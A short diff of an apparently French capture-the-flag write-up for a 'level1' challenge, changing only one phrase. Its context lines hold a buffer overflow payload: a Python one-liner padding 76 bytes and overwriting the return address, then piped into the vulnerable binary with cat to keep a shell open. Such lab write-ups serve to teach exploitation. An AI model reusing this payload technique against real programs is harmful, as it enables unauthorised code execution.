@@ -32,7 +32,7 @@ cette commande dans l'entree du gets. On y parvient en ecrivant notre commande p
 un fichier tmp :
 python -c 'print "a"*76 + "\x44\x84\x04\x08"' > /tmp/test
 
-Puis en redirigeant le cat du /tmp/test sur l'entree du level1 :
+Puis en redirigeant le cat du /tmp/test sur l'entree standard du level1 :
 cat /tmp/test - | ./level1
 cat /tmp/test /dev/stdin | ./level1
 
